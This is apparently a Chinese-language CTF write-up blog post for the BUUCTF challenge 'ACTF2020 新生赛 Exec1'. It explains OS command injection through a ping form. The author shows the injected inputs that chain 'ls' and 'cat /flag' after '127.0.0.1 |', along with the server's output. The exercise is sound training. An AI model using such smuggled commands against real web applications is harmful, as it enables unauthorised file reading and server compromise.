---
title: [ACTF2020 新生赛 Exec1 BUUCTF]
date: 2026-04-11 22:33:31
tags: [每天一道CTF,web]
categories: CTF
author: Jack
---

# [ACTF2020 新生赛 Exec1 BUUCTF]



开始打开靶机时，发现显示503 Service Temporarily Unavailable，意思是服务暂时不可用。
5XX状态码表示服务端故障，例如：

- 500 Internal Server Error——服务器内部错误
- 501 Not Implemented——服务器不支持该功能
- 502 Bad Gateway——网关或代理服务器故障
- 503 Service Unavailable——服务暂不可用
- 504 Gateway Timeout——服务器处理时间超时，网关或代理服务器未及时响应请求

## 题目描述

本题考察点是命令注入

![题目页面](ACTF2020 Exec1/first_step.png)

打开页面，发现是个PING，有一个输入框。
ping是操作系统命令，是需要服务器执行的指令
在web开发时，当后端需要调用操作系统级别的外部指令时，程序员常使用字符串拼接(String Concatenation)的方法动态构造命令字符串,你在输入框中的输入会从前段传送到后端操作系统传输层，如果对传入的字符串未加审查就拼接，传入的字符串可能会变为未经允许的操作指令。

### How to deal with it

看到这个ping，我的目的肯定不是ping某个东西，我在乎的是服务器里的文件，所以我要借着ping命令的合法执行，夹带点私活进去。

这个靠的是Linux Shell的命令分割与链接机制，比如说：

- `|` 管道符(pipe)——把前一条指令的标准输出作为后一条指令的标准输入

想要知道服务器里有什么文件，用的是 `ls` 指令（当前目录——查看当前所在文件夹的内容），所以只要把 `ls` 指令捆绑在一个肯定能执行的ping指令后面，它就会忠诚履职，输出服务器上的文件目录。
ping什么呢？一个合法的前缀，让ping顺利执行——127.0.0.1 是本地回环地址（ping自己，永远ping的通）

**输入：**

```bash
127.0.0.1 | ls
```

**输出：**

```
index.php
```

注入成功，下一步看看他的上级目录或者根目录里有什么

**输入：**

```bash
127.0.0.1 | ls/ #ls/ means 查看整个服务器最顶层的目录
```

**输出：**

```
    bin
    dev
    etc
    flag
    home
    lib
    media
    mnt
    opt
    proc
    root
    run
    sbin
    srv
    sys
    tmp
    usr
    var
```

发现 flag，直接使用 `cat` 命令读取：

- `cat` 命令：把一个文件的内容读取出来，并打印（显示）在屏幕上
- `/flag`：服务器根目录下的一个名为 flag 的文件

**输入：**

```bash
127.0.0.1 | cat /flag
```

**输出：**

```
flag{d772e953-edd7-4d0c-b724-079909a9ffc6}
```


## Mission Success! 🎉

---

**作者**：Jack 
**发布时间**：2026-04-11  

